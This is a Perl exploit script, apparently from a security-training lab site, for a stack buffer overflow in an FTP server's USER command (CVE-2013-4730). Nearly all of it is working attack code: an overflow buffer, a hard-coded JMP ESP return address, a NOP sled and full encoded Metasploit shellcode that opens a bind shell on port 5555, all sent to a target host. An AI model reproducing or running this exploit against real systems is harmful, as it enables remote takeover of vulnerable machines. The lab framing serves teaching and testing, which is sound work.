#!/usr/bin/perl

# - As a condition of your use of this Web site and Code, you warrant to computersecuritystudent.com
#   that you will not use this Web site or Code for any purpose that is unlawful or that is
#   prohibited by these terms, conditions, and notices.
# - In accordance with UCC § 2-316, this product is provided with "no warranties, either express or
#   implied." The information contained is provided "as-is", with "no guarantee of merchantability."
# - In addition, this is a teaching website that does not condone malicious behavior of any kind.
# - You are on notice, that continuing and/or using this lab and code outside your "own" test
#   environment is considered malicious and is against the law.
# - © 2016 No content replication of any kind is allowed without express written permission.
# - Authors: @bobmitch2311 and @HKD_student

# Creates an IO::Socket::INET object interface
use IO::Socket;

chomp($IPADDRESS        = $ARGV[0]);
chomp($PORT             = $ARGV[1]);
chomp($COUNT            = $ARGV[2]);

if(($IPADDRESS eq "")||($PORT eq "")||($COUNT eq ""))
{
        print "Help Usage\n";
        print "------------------------------------------------\n";
        print "$0 <IPADDRESS> <PORT> <OFFSET_COUNT>\n";
        print "------------------------------------------------\n";
        print "E.g., $0 192.168.2.106 21 3000\n";
        exit;
}

# FTP Links
# https://www.ietf.org/rfc/rfc959.txt
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730
# Per CVE-2013-4730 and RFC will fuzz the USER variable that does
# need to contain a <space> after the string (USER)
# E.g., (USER )

$header = "USER ";

# Create a string of many A's
# The Hexidecimal for A is (x41)
# E.g., 2001 AAAAAA....AAAA's
# This is the OFFSET we were provided from pattern_create.rb
# E.g., /usr/share/metasploit-framework/tools/pattern_create.rb 2007

$junk 	= "\x41" x $COUNT;

# JMP ESP | SHELL32.dll 7C9D30D7   FFE4
# Replace the 4 BBBB's with the JMP ESP Register
# Bit and Byte Order x86 is little-endian. In illustrations of data structures
# in memory, smaller addresses appear toward the bottom of the figure; addresses
# increase toward the top. Bit positions are numbered from right to left. The numerical
# value of a set bit is equal to two raised to the power of the bit position.
# IA-32 processors are “little endian” machines; this means the bytes of a word are
# numbered starting from the least significant byte

$eip 	= "\xD7\x30\x9D\x7C";

# Blank Spaces
# Helps ensure to make sure shellcode is not cut off
$nops = "\x90" x 20;

# msfpayload windows/shell_bind_tcp LPORT=5555 EXITFUNC=seh R | msfencode -b '\x00\x0a\x0d' -t perl -e x86/alpha_upper
# Known Bad Characters
# x00 - null byte (removed)
# x0A - carriage return (removed)
# x0D - new line (removed)


my $buf = "\xd9\xc2\xd9\x74\x24\xf4\x5b\x53\x59\x49\x49\x49\x43\x43" .
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58" .
"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" .
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" .
"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58" .
"\x4b\x39\x35\x50\x35\x50\x55\x50\x43\x50\x4c\x49\x4d\x35" .
"\x56\x51\x49\x42\x52\x44\x4c\x4b\x46\x32\x56\x50\x4c\x4b" .
"\x36\x32\x54\x4c\x4c\x4b\x31\x42\x45\x44\x4c\x4b\x32\x52" .
"\x31\x38\x44\x4f\x58\x37\x30\x4a\x56\x46\x46\x51\x4b\x4f" .
"\x30\x31\x39\x50\x4e\x4c\x57\x4c\x45\x31\x43\x4c\x54\x42" .
"\x46\x4c\x47\x50\x39\x51\x48\x4f\x34\x4d\x43\x31\x48\x47" .
"\x4d\x32\x5a\x50\x56\x32\x46\x37\x4c\x4b\x36\x32\x54\x50" .
"\x4c\x4b\x31\x52\x37\x4c\x45\x51\x38\x50\x4c\x4b\x57\x30" .
"\x54\x38\x4d\x55\x49\x50\x32\x54\x51\x5a\x43\x31\x38\x50" .
"\x30\x50\x4c\x4b\x37\x38\x42\x38\x4c\x4b\x36\x38\x57\x50" .
"\x45\x51\x38\x53\x4d\x33\x57\x4c\x47\x39\x4c\x4b\x47\x44" .
"\x4c\x4b\x45\x51\x49\x46\x50\x31\x4b\x4f\x56\x51\x4f\x30" .
"\x4e\x4c\x49\x51\x48\x4f\x34\x4d\x45\x51\x48\x47\x30\x38" .
"\x4d\x30\x33\x45\x4c\x34\x43\x33\x53\x4d\x4c\x38\x57\x4b" .
"\x43\x4d\x57\x54\x33\x45\x4d\x32\x51\x48\x4c\x4b\x51\x48" .
"\x46\x44\x43\x31\x49\x43\x52\x46\x4c\x4b\x54\x4c\x30\x4b" .
"\x4c\x4b\x50\x58\x35\x4c\x43\x31\x49\x43\x4c\x4b\x55\x54" .
"\x4c\x4b\x33\x31\x4e\x30\x4b\x39\x31\x54\x57\x54\x51\x34" .
"\x31\x4b\x51\x4b\x33\x51\x31\x49\x51\x4a\x50\x51\x4b\x4f" .
"\x4d\x30\x56\x38\x51\x4f\x51\x4a\x4c\x4b\x42\x32\x5a\x4b" .
"\x4b\x36\x51\x4d\x33\x58\x37\x43\x57\x42\x55\x50\x53\x30" .
"\x32\x48\x32\x57\x53\x43\x47\x42\x31\x4f\x51\x44\x42\x48" .
"\x50\x4c\x52\x57\x56\x46\x54\x47\x4b\x4f\x58\x55\x4f\x48" .
"\x4a\x30\x45\x51\x45\x50\x43\x30\x57\x59\x48\x44\x56\x34" .
"\x50\x50\x33\x58\x51\x39\x4b\x30\x32\x4b\x35\x50\x4b\x4f" .
"\x48\x55\x56\x30\x46\x30\x46\x30\x56\x30\x31\x50\x30\x50" .
"\x47\x30\x56\x30\x33\x58\x4b\x5a\x44\x4f\x49\x4f\x4b\x50" .
"\x4b\x4f\x4e\x35\x4c\x49\x59\x57\x50\x31\x49\x4b\x56\x33" .
"\x52\x48\x35\x52\x33\x30\x52\x35\x4f\x43\x4d\x59\x4b\x56" .
"\x43\x5a\x44\x50\x51\x46\x31\x47\x53\x58\x48\x42\x49\x4b" .
"\x36\x57\x45\x37\x4b\x4f\x49\x45\x30\x53\x50\x57\x53\x58" .
"\x4f\x47\x5a\x49\x47\x48\x4b\x4f\x4b\x4f\x39\x45\x30\x53" .
"\x30\x53\x46\x37\x53\x58\x33\x44\x4a\x4c\x47\x4b\x4b\x51" .
"\x4b\x4f\x4e\x35\x50\x57\x4d\x59\x49\x57\x32\x48\x32\x55" .
"\x52\x4e\x30\x4d\x33\x51\x4b\x4f\x39\x45\x55\x38\x35\x33" .
"\x42\x4d\x55\x34\x35\x50\x4b\x39\x4a\x43\x36\x37\x30\x57" .
"\x51\x47\x56\x51\x4c\x36\x52\x4a\x34\x52\x51\x49\x56\x36" .
"\x5a\x42\x4b\x4d\x42\x46\x58\x47\x47\x34\x36\x44\x37\x4c" .
"\x55\x51\x33\x31\x4c\x4d\x57\x34\x47\x54\x42\x30\x48\x46" .
"\x43\x30\x50\x44\x46\x34\x50\x50\x31\x46\x30\x56\x30\x56" .
"\x57\x36\x36\x36\x30\x4e\x50\x56\x46\x36\x50\x53\x51\x46" .
"\x45\x38\x42\x59\x48\x4c\x57\x4f\x4c\x46\x4b\x4f\x49\x45" .
"\x4d\x59\x4b\x50\x50\x4e\x46\x36\x30\x46\x4b\x4f\x46\x50" .
"\x53\x58\x43\x38\x4d\x57\x35\x4d\x33\x50\x4b\x4f\x59\x45" .
"\x4f\x4b\x4b\x4e\x44\x4e\x47\x42\x5a\x4a\x45\x38\x4f\x56" .
"\x4a\x35\x4f\x4d\x4d\x4d\x4b\x4f\x59\x45\x57\x4c\x44\x46" .
"\x33\x4c\x35\x5a\x4d\x50\x4b\x4b\x4d\x30\x32\x55\x43\x35" .
"\x4f\x4b\x30\x47\x55\x43\x32\x52\x52\x4f\x52\x4a\x45\x50" .
"\x46\x33\x4b\x4f\x49\x45\x41\x41";

# Create a fuzzing string that looks like
# x00 is removed
# USER<SPACE>|AAAA($COUNT)AAAA|EIP(D7309D7C)|NOPS|PAYLOAD

$string = $header.$junk.$eip.$nops.$buf;

$socket = IO::Socket::INET->new(
PeerAddr => "$IPADDRESS",
PeerPort => "$PORT",
Proto => "tcp"
);

# Receive Banner
$socket ->recv($serverdata, 1024);

# Send | USER<SPACE>|AAAA($COUNT)AAAA|EIP(D7309D7C)|NOPS|PAYLOAD
$socket ->send($string);

print "===> [Sending|--> USER<space> AAAA($COUNT)AAAA|EIP(D7309D7C)|NOPS|PAYLOAD]\n";

# Close | Socket
close($socket);
